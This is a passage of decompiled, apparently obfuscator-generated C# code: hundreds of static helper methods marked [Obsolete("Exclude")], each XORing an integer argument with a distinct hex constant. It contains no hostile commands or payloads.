		return int_4 ^ 0x64BF46CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6291(int int_4)
	{
		return int_4 ^ 0xB5B850E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6292(int int_4)
	{
		return int_4 ^ 0x387CD785;
	}

	[Obsolete("Exclude")]
	public static int smethod_6293(int int_4)
	{
		return int_4 ^ 0xA8248DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6294(int int_4)
	{
		return int_4 ^ 0x1BCD2334;
	}

	[Obsolete("Exclude")]
	public static int smethod_6295(int int_4)
	{
		return int_4 ^ 0x582EA5F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6296(int int_4)
	{
		return int_4 ^ 0x67734DFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6297(int int_4)
	{
		return int_4 ^ 0x927A4F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6298(int int_4)
	{
		return int_4 ^ 0x29CD7043;
	}

	[Obsolete("Exclude")]
	public static int smethod_6299(int int_4)
	{
		return int_4 ^ 0x4D19A761;
	}

	[Obsolete("Exclude")]
	public static int smethod_6300(int int_4)
	{
		return int_4 ^ 0x5FAF6FC4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6301(int int_4)
	{
		return int_4 ^ 0x70448A50;
	}

	[Obsolete("Exclude")]
	public static int smethod_6302(int int_4)
	{
		return int_4 ^ 0x1A196D5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6303(int int_4)
	{
		return int_4 ^ 0x244D219;
	}

	[Obsolete("Exclude")]
	public static int smethod_6304(int int_4)
	{
		return int_4 ^ 0x29334DCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6305(int int_4)
	{
		return int_4 ^ 0x6541F8CD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6306(int int_4)
	{
		return int_4 ^ 0x209DFF0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6307(int int_4)
	{
		return int_4 ^ 0x64CAA54F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6308(int int_4)
	{
		return int_4 ^ 0x76814C26;
	}

	[Obsolete("Exclude")]
	public static int smethod_6309(int int_4)
	{
		return int_4 ^ 0x13C85A70;
	}

	[Obsolete("Exclude")]
	public static int smethod_6310(int int_4)
	{
		return int_4 ^ 0x6FF59ACB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6311(int int_4)
	{
		return int_4 ^ 0x7FEDFE00;
	}

	[Obsolete("Exclude")]
	public static int smethod_6312(int int_4)
	{
		return int_4 ^ 0x2E5CC8AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6313(int int_4)
	{
		return int_4 ^ 0x6980B4F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6314(int int_4)
	{
		return int_4 ^ 0x2AA5C0CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6315(int int_4)
	{
		return int_4 ^ 0x65665502;
	}

	[Obsolete("Exclude")]
	public static int smethod_6316(int int_4)
	{
		return int_4 ^ 0x346BFA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6317(int int_4)
	{
		return int_4 ^ 0xD8C383D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6318(int int_4)
	{
		return int_4 ^ 0x295AC3A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6319(int int_4)
	{
		return int_4 ^ 0x5E899DCB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6320(int int_4)
	{
		return int_4 ^ 0x56D00B8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6321(int int_4)
	{
		return int_4 ^ 0x1F3B2908;
	}

	[Obsolete("Exclude")]
	public static int smethod_6322(int int_4)
	{
		return int_4 ^ 0x748818F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6323(int int_4)
	{
		return int_4 ^ 0x2BD56AE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6324(int int_4)
	{
		return int_4 ^ 0x21B98AA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6325(int int_4)
	{
		return int_4 ^ 0x880D24D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6326(int int_4)
	{
		return int_4 ^ 0x5FA173FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6328(int int_4)
	{
		return int_4 ^ 0x70D9A18A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6329(int int_4)
	{
		return int_4 ^ 0x40A92685;
	}

	[Obsolete("Exclude")]
	public static int smethod_6330(int int_4)
	{
		return int_4 ^ 0xBCA61A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6331(int int_4)
	{
		return int_4 ^ 0x4C689365;
	}

	[Obsolete("Exclude")]
	public static int smethod_6332(int int_4)
	{
		return int_4 ^ 0x22A7DB8D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6333(int int_4)
	{
		return int_4 ^ 0x76306668;
	}

	[Obsolete("Exclude")]
	public static int smethod_6334(int int_4)
	{
		return int_4 ^ 0x72943D71;
	}

	[Obsolete("Exclude")]
	public static int smethod_6335(int int_4)
	{
		return int_4 ^ 0x772F3487;
	}

	[Obsolete("Exclude")]
	public static int smethod_6336(int int_4)
	{
		return int_4 ^ 0x71ABC771;
	}

	[Obsolete("Exclude")]
	public static int smethod_6337(int int_4)
	{
		return int_4 ^ 0x4F68002C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6338(int int_4)
	{
		return int_4 ^ 0x53294FB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6339(int int_4)
	{
		return int_4 ^ 0x2245BF2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6340(int int_4)
	{
		return int_4 ^ 0xA775155;
	}

	[Obsolete("Exclude")]
	public static int smethod_6341(int int_4)
	{
		return int_4 ^ 0x6843DAD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_6342(int int_4)
	{
		return int_4 ^ 0x75A51905;
	}

	[Obsolete("Exclude")]
	public static int smethod_6343(int int_4)
	{
		return int_4 ^ 0x61272B19;
	}

	[Obsolete("Exclude")]
	public static int smethod_6345(int int_4)
	{
		return int_4 ^ 0x6D94A2A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6346(int int_4)
	{
		return int_4 ^ 0x45BFA03E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6347(int int_4)
	{
		return int_4 ^ 0x3A3A299A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6348(int int_4)
	{
		return int_4 ^ 0x10E98CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6349(int int_4)
	{
		return int_4 ^ 0x6BFBDFC7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6350(int int_4)
	{
		return int_4 ^ 0x7BFDDBA4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6351(int int_4)
	{
		return int_4 ^ 0x232F700A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6352(int int_4)
	{
		return int_4 ^ 0x734D6124;
	}

	[Obsolete("Exclude")]
	public static int smethod_6353(int int_4)
	{
		return int_4 ^ 0x4425219C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6354(int int_4)
	{
		return int_4 ^ 0x6D41A98D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6355(int int_4)
	{
		return int_4 ^ 0x671ABA86;
	}

	[Obsolete("Exclude")]
	public static int smethod_6356(int int_4)
	{
		return int_4 ^ 0x6DDFEB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6358(int int_4)
	{
		return int_4 ^ 0x2CAB6CD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6359(int int_4)
	{
		return int_4 ^ 0x770D3376;
	}

	[Obsolete("Exclude")]
	public static int smethod_6360(int int_4)
	{
		return int_4 ^ 0x1BD32E75;
	}

	[Obsolete("Exclude")]
	public static int smethod_6362(int int_4)
	{
		return int_4 ^ 0x5EF6F9F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6363(int int_4)
	{
		return int_4 ^ 0x4F358484;
	}

	[Obsolete("Exclude")]
	public static int smethod_6365(int int_4)
	{
		return int_4 ^ 0x77B9576D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6366(int int_4)
	{
		return int_4 ^ 0x74EA1CA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6367(int int_4)
	{
		return int_4 ^ 0x225F0319;
	}

	[Obsolete("Exclude")]
	public static int smethod_6368(int int_4)
	{
		return int_4 ^ 0x113C5933;
	}

	[Obsolete("Exclude")]
	public static int smethod_6369(int int_4)
	{
		return int_4 ^ 0x30473205;
	}

	[Obsolete("Exclude")]
	public static int smethod_6370(int int_4)
	{
		return int_4 ^ 0x38E0AC95;
	}

	[Obsolete("Exclude")]
	public static int smethod_6371(int int_4)
	{
		return int_4 ^ 0x52B8DD75;
	}

	[Obsolete("Exclude")]
	public static int smethod_6372(int int_4)
	{
		return int_4 ^ 0x6F298234;
	}

	[Obsolete("Exclude")]
	public static int smethod_6373(int int_4)
	{
		return int_4 ^ 0x8FAB67D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6374(int int_4)
	{
		return int_4 ^ 0x4B014A49;
	}

	[Obsolete("Exclude")]
	public static int smethod_6375(int int_4)
	{
		return int_4 ^ 0x461B25E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6376(int int_4)
	{
		return int_4 ^ 0x3FD94B30;
	}

	[Obsolete("Exclude")]
	public static int smethod_6377(int int_4)
	{
		return int_4 ^ 0x6DD30E1C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6378(int int_4)
	{
		return int_4 ^ 0x347591BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6379(int int_4)
	{
		return int_4 ^ 0x3B47B2BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6380(int int_4)
	{
		return int_4 ^ 0x7A7FE9C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6381(int int_4)
	{
		return int_4 ^ 0x17F6665C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6382(int int_4)
	{
		return int_4 ^ 0x3ECF742C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6383(int int_4)
	{
		return int_4 ^ 0x78FE2BF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6385(int int_4)
	{
		return int_4 ^ 0x7F306C99;
	}

	[Obsolete("Exclude")]
	public static int smethod_6386(int int_4)
	{
		return int_4 ^ 0x360321A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6387(int int_4)
	{
		return int_4 ^ 0x58CA4728;
	}

	[Obsolete("Exclude")]
	public static int smethod_6389(int int_4)
	{
		return int_4 ^ 0x10B5A22;
	}

	[Obsolete("Exclude")]
	public static int smethod_6390(int int_4)
	{
		return int_4 ^ 0xC9B9C97;
	}

	[Obsolete("Exclude")]
	public static int smethod_6391(int int_4)
	{
		return int_4 ^ 0x7C5CD043;
	}

	[Obsolete("Exclude")]
	public static int smethod_6392(int int_4)
	{
		return int_4 ^ 0x5E4034E0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6393(int int_4)
	{
		return int_4 ^ 0xFFCA247;
	}

	[Obsolete("Exclude")]
	public static int smethod_6394(int int_4)
	{
		return int_4 ^ 0x5C224615;
	}

	[Obsolete("Exclude")]
	public static int smethod_6395(int int_4)
	{
		return int_4 ^ 0x5610CECD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6396(int int_4)
	{
		return int_4 ^ 0x72074492;
	}

	[Obsolete("Exclude")]
	public static int smethod_6397(int int_4)
	{
		return int_4 ^ 0x76BEA561;
	}

	[Obsolete("Exclude")]
	public static int smethod_6398(int int_4)
	{
		return int_4 ^ 0x77CFCEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6399(int int_4)
	{
		return int_4 ^ 0x1671DA29;
	}

	[Obsolete("Exclude")]
	public static int smethod_6401(int int_4)
	{
		return int_4 ^ 0x38858465;
	}

	[Obsolete("Exclude")]
	public static int smethod_6403(int int_4)
	{
		return int_4 ^ 0x17155FA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6404(int int_4)
	{
		return int_4 ^ 0x2FF0500A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6405(int int_4)
	{
		return int_4 ^ 0x27B50BD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6407(int int_4)
	{
		return int_4 ^ 0x7039D327;
	}

	[Obsolete("Exclude")]
	public static int smethod_6408(int int_4)
	{
		return int_4 ^ 0x84DBC8A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6409(int int_4)
	{
		return int_4 ^ 0x396DFE03;
	}

	[Obsolete("Exclude")]
	public static int smethod_6410(int int_4)
	{
		return int_4 ^ 0x47A52AE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6411(int int_4)
	{
		return int_4 ^ 0x256E2A0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6412(int int_4)
	{
		return int_4 ^ 0x1E208A43;
	}

	[Obsolete("Exclude")]
	public static int smethod_6413(int int_4)
	{
		return int_4 ^ 0x2813BA5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6414(int int_4)
	{
		return int_4 ^ 0x5CB40516;
	}

	[Obsolete("Exclude")]
	public static int smethod_6415(int int_4)
	{
		return int_4 ^ 0x791CF3F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6416(int int_4)
	{
		return int_4 ^ 0x874EF6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6417(int int_4)
	{
		return int_4 ^ 0xEE4223B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6418(int int_4)
	{
		return int_4 ^ 0x1CF24066;
	}

	[Obsolete("Exclude")]
	public static int smethod_6419(int int_4)
	{
		return int_4 ^ 0xEE6524C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6420(int int_4)
	{
		return int_4 ^ 0x3E99BFBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6421(int int_4)
	{
		return int_4 ^ 0x841BEBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6423(int int_4)
	{
		return int_4 ^ 0x3EAE0530;
	}

	[Obsolete("Exclude")]
	public static int smethod_6424(int int_4)
	{
		return int_4 ^ 0x7A9BA0E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6425(int int_4)
	{
		return int_4 ^ 0x50917DB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6427(int int_4)
	{
		return int_4 ^ 0x27BD6DC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6428(int int_4)
	{
		return int_4 ^ 0xAE5779B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6431(int int_4)
	{
		return int_4 ^ 0x5B64D79E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6432(int int_4)
	{
		return int_4 ^ 0x450DD488;
	}

	[Obsolete("Exclude")]
	public static int smethod_6433(int int_4)
	{
		return int_4 ^ 0x90042ED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6435(int int_4)
	{
		return int_4 ^ 0x276125DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6436(int int_4)
	{
		return int_4 ^ 0x780AD50F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6437(int int_4)
	{
		return int_4 ^ 0x3A6B2633;
	}

	[Obsolete("Exclude")]
	public static int smethod_6438(int int_4)
	{
		return int_4 ^ 0x31FF4D63;
	}

	[Obsolete("Exclude")]
	public static int smethod_6439(int int_4)
	{
		return int_4 ^ 0x125CE581;
	}

	[Obsolete("Exclude")]
	public static int smethod_6440(int int_4)
	{
		return int_4 ^ 0x4960271E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6441(int int_4)
	{
		return int_4 ^ 0x6224F5CC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6444(int int_4)
	{
		return int_4 ^ 0x5417C12C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6445(int int_4)
	{
		return int_4 ^ 0x56774F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6446(int int_4)
	{
		return int_4 ^ 0x365A6E2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6447(int int_4)
	{
		return int_4 ^ 0x18AC939E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6448(int int_4)
	{
		return int_4 ^ 0x32F1F972;
	}

	[Obsolete("Exclude")]
	public static int smethod_6449(int int_4)
	{
		return int_4 ^ 0x5E0839BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6450(int int_4)
	{
		return int_4 ^ 0x5025ECA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6451(int int_4)
	{
		return int_4 ^ 0x29DDB049;
	}

	[Obsolete("Exclude")]
	public static int smethod_6452(int int_4)
	{
		return int_4 ^ 0x63A5594B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6453(int int_4)
	{
		return int_4 ^ 0x55F1D387;
	}

	[Obsolete("Exclude")]
	public static int smethod_6455(int int_4)
	{
		return int_4 ^ 0x66D7446;
	}

	[Obsolete("Exclude")]
	public static int smethod_6456(int int_4)
	{
		return int_4 ^ 0x134ABF93;
	}

	[Obsolete("Exclude")]
	public static int smethod_6457(int int_4)
	{
		return int_4 ^ 0x742ACF0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6458(int int_4)
	{
		return int_4 ^ 0x9B6A761;
	}

	[Obsolete("Exclude")]
	public static int smethod_6459(int int_4)
	{
		return int_4 ^ 0x7B2E5FAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6460(int int_4)
	{
		return int_4 ^ 0x7D0A3381;
	}

	[Obsolete("Exclude")]
	public static int smethod_6461(int int_4)
	{
		return int_4 ^ 0x379B4DF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6462(int int_4)
	{
		return int_4 ^ 0x47652C56;
	}

	[Obsolete("Exclude")]
	public static int smethod_6463(int int_4)
	{
		return int_4 ^ 0x2F33111C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6464(int int_4)
	{
		return int_4 ^ 0x5BB7B4E7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6465(int int_4)
	{
		return int_4 ^ 0x78394363;
	}

	[Obsolete("Exclude")]
	public static int smethod_6466(int int_4)
	{
		return int_4 ^ 0x4EF04A70;
	}

	[Obsolete("Exclude")]
	public static int smethod_6467(int int_4)
	{
		return int_4 ^ 0x3C3FB6D2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6469(int int_4)
	{
		return int_4 ^ 0x2B887BA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6470(int int_4)
	{
		return int_4 ^ 0x32C443C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6471(int int_4)
	{
		return int_4 ^ 0x7FE5A651;
	}

	[Obsolete("Exclude")]
	public static int smethod_6472(int int_4)
	{
		return int_4 ^ 0xAB1C336;
	}

	[Obsolete("Exclude")]
	public static int smethod_6473(int int_4)
	{
		return int_4 ^ 0x5E466153;
	}

	[Obsolete("Exclude")]
	public static int smethod_6474(int int_4)
	{
		return int_4 ^ 0xAEDA7B7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6475(int int_4)
	{
		return int_4 ^ 0x50AAF957;
	}

	[Obsolete("Exclude")]
	public static int smethod_6476(int int_4)
	{
		return int_4 ^ 0xCB60F0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6477(int int_4)
	{
		return int_4 ^ 0x7C982D6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6478(int int_4)
	{
		return int_4 ^ 0x5EA93F57;
	}

	[Obsolete("Exclude")]
	public static int smethod_6479(int int_4)
	{
		return int_4 ^ 0x621F4C8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6480(int int_4)
	{
		return int_4 ^ 0x211DAA9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6481(int int_4)
	{
		return int_4 ^ 0x55D93026;
	}

	[Obsolete("Exclude")]
	public static int smethod_6482(int int_4)
	{
		return int_4 ^ 0x95150A9;
	}

	[Obsolete("Exclude")]
	public static int smethod_6483(int int_4)
	{
		return int_4 ^ 0x77E19501;
	}

	[Obsolete("Exclude")]
	public static int smethod_6485(int int_4)
	{
		return int_4 ^ 0x5A9BFB6C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6486(int int_4)
	{
		return int_4 ^ 0x42A9B6A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6487(int int_4)
	{
		return int_4 ^ 0x59EFCABA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6488(int int_4)
	{
		return int_4 ^ 0x4627B4EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6489(int int_4)
	{
		return int_4 ^ 0x4E49F5FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6490(int int_4)
	{
		return int_4 ^ 0x550750C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6492(int int_4)
	{
		return int_4 ^ 0x3C89B4A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6493(int int_4)
	{
		return int_4 ^ 0xE6C5596;
	}

	[Obsolete("Exclude")]
	public static int smethod_6494(int int_4)
	{
		return int_4 ^ 0x133EADBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6495(int int_4)
	{
		return int_4 ^ 0xE756903;
	}

	[Obsolete("Exclude")]
	public static int smethod_6496(int int_4)
	{
		return int_4 ^ 0x1BB93E89;
	}

	[Obsolete("Exclude")]
	public static int smethod_6497(int int_4)
	{
		return int_4 ^ 0x169D1E56;
	}

	[Obsolete("Exclude")]
	public static int smethod_6498(int int_4)
	{
		return int_4 ^ 0x256227B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6499(int int_4)
	{
		return int_4 ^ 0x2DC54F74;
	}

	[Obsolete("Exclude")]
	public static int smethod_6500(int int_4)
	{
		return int_4 ^ 0x651DE98F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6501(int int_4)
	{
		return int_4 ^ 0x5F70EA12;
	}

	[Obsolete("Exclude")]
	public static int smethod_6502(int int_4)
	{
		return int_4 ^ 0x5615ACB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6503(int int_4)
	{
		return int_4 ^ 0x62EDE03C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6504(int int_4)
	{
		return int_4 ^ 0x515CF6BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6506(int int_4)
	{
		return int_4 ^ 0x672A0CA7;
	}

	[Obsolete("Exclude")]
	public static int smethod_6507(int int_4)
	{
		return int_4 ^ 0x5E1A0A1F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6508(int int_4)
	{
		return int_4 ^ 0x7E31BF3D;
	}

	[Obsolete("Exclude")]
	public static int smethod_6509(int int_4)
	{
		return int_4 ^ 0x1D2530AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_6510(int int_4)
	{
		return int_4 ^ 0x7FEA6443;
	}

	[Obsolete("Exclude")]
	public static int smethod_6511(int int_4)
	{
		return int_4 ^ 0x2BE56B83;
	}

	[Obsolete("Exclude")]
	public static int smethod_6512(int int_4)
	{
		return int_4 ^ 0x48A1ED41;
	}

	[Obsolete("Exclude")]
	public static int smethod_6513(int int_4)
	{
		return int_4 ^ 0x2FEFB9CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_6514(int int_4)
	{
		return int_4 ^ 0x5954EB5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6515(int int_4)
	{
		return int_4 ^ 0x126373A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6516(int int_4)
	{
		return int_4 ^ 0x3A7DDB65;
	}

	[Obsolete("Exclude")]
	public static int smethod_6517(int int_4)
	{
		return int_4 ^ 0x10270DD5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6518(int int_4)
	{
		return int_4 ^ 0x639DB9E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6519(int int_4)
	{
		return int_4 ^ 0x591608A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6520(int int_4)
	{
		return int_4 ^ 0x7E2F6EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6521(int int_4)
	{
		return int_4 ^ 0x331C9E98;
	}

	[Obsolete("Exclude")]
	public static int smethod_6522(int int_4)
	{
		return int_4 ^ 0x65239344;
	}

	[Obsolete("Exclude")]
	public static int smethod_6523(int int_4)
	{
		return int_4 ^ 0x6F2C5051;
	}

	[Obsolete("Exclude")]
	public static int smethod_6524(int int_4)
	{
		return int_4 ^ 0x46FA5C1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_6526(int int_4)
	{
		return int_4 ^ 0x245746BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6527(int int_4)
	{
		return int_4 ^ 0x55A26DED;
	}

	[Obsolete("Exclude")]
	public static int smethod_6528(int int_4)
	{
		return int_4 ^ 0x5DADA052;
	}

	[Obsolete("Exclude")]
	public static int smethod_6529(int int_4)
	{
		return int_4 ^ 0x585A016F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6530(int int_4)
	{
		return int_4 ^ 0x47FFE2A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_6531(int int_4)
	{
		return int_4 ^ 0x382DA876;
	}

	[Obsolete("Exclude")]
	public static int smethod_6532(int int_4)
	{
		return int_4 ^ 0x4F342695;
	}

	[Obsolete("Exclude")]
	public static int smethod_6533(int int_4)
	{
		return int_4 ^ 0x40BB8663;
	}

	[Obsolete("Exclude")]
	public static int smethod_6534(int int_4)
	{
		return int_4 ^ 0x50756FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6535(int int_4)
	{
		return int_4 ^ 0x752D600E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6536(int int_4)
	{
		return int_4 ^ 0x3A33AFCC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6537(int int_4)
	{
		return int_4 ^ 0x30ACA48C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6538(int int_4)
	{
		return int_4 ^ 0x65FF779E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6539(int int_4)
	{
		return int_4 ^ 0x989382A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6540(int int_4)
	{
		return int_4 ^ 0x6CE828A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6541(int int_4)
	{
		return int_4 ^ 0x52434679;
	}

	[Obsolete("Exclude")]
	public static int smethod_6542(int int_4)
	{
		return int_4 ^ 0x495E5386;
	}

	[Obsolete("Exclude")]
	public static int smethod_6543(int int_4)
	{
		return int_4 ^ 0x6FAD873A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6544(int int_4)
	{
		return int_4 ^ 0x3DE9AD74;
	}

	[Obsolete("Exclude")]
	public static int smethod_6545(int int_4)
	{
		return int_4 ^ 0x2608B823;
	}

	[Obsolete("Exclude")]
	public static int smethod_6546(int int_4)
	{
		return int_4 ^ 0x286F406C;
	}

	[Obsolete("Exclude")]
	public static int smethod_6547(int int_4)
	{
		return int_4 ^ 0x25D0DC5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6549(int int_4)
	{
		return int_4 ^ 0x486A2679;
	}

	[Obsolete("Exclude")]
	public static int smethod_6550(int int_4)
	{
		return int_4 ^ 0x569FDD69;
	}

	[Obsolete("Exclude")]
	public static int smethod_6551(int int_4)
	{
		return int_4 ^ 0x3AF4FF93;
	}

	[Obsolete("Exclude")]
	public static int smethod_6552(int int_4)
	{
		return int_4 ^ 0x7EB8512E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6553(int int_4)
	{
		return int_4 ^ 0x67053ACD;
	}

	[Obsolete("Exclude")]
	public static int smethod_6554(int int_4)
	{
		return int_4 ^ 0x41C29C61;
	}

	[Obsolete("Exclude")]
	public static int smethod_6555(int int_4)
	{
		return int_4 ^ 0x12F74CB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_6556(int int_4)
	{
		return int_4 ^ 0x770C675;
	}

	[Obsolete("Exclude")]
	public static int smethod_6557(int int_4)
	{
		return int_4 ^ 0x7734DBE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_6560(int int_4)
	{
		return int_4 ^ 0x4058FCE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6561(int int_4)
	{
		return int_4 ^ 0xDABE6EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_6562(int int_4)
	{
		return int_4 ^ 0x6C563AE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_6564(int int_4)
	{
		return int_4 ^ 0x535C6ACA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6565(int int_4)
	{
		return int_4 ^ 0x2DD6DD80;
	}

	[Obsolete("Exclude")]
	public static int smethod_6566(int int_4)
	{
		return int_4 ^ 0x461B82F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6567(int int_4)
	{
		return int_4 ^ 0x43AA0CA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_6568(int int_4)
	{
		return int_4 ^ 0x3024BAF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_6569(int int_4)
	{
		return int_4 ^ 0x3D4F3DB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_6571(int int_4)
	{
		return int_4 ^ 0x451437CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6572(int int_4)
	{
		return int_4 ^ 0x79D6DB3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_6573(int int_4)
	{
		return int_4 ^ 0x4A476BFA;
	}

	[Obsolete("Exclude")]
	public static int smethod_6574(int int_4)
	{
		return int_4 ^ 0x29522C46;
	}

	[Obsolete("Exclude")]
	public static int smethod_6575(int int_4)
	{
		return int_4 ^ 0x763AF08F;
	}

	[Obsolete("Exclude")]
	public static int smethod_6576(int int_4)
	{
		return int_4 ^ 0x55F8FB51;
	}

	[Obsolete("Exclude")]
	public static int smethod_6577(int int_4)
	{
		return int_4 ^ 0x1F4B82DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_6579(int int_4)
	{
		return int_4 ^ 0x19DE148A;
	}

	[Obsolete("Exclude")]
	public static int smethod_6580(int int_4)
	{
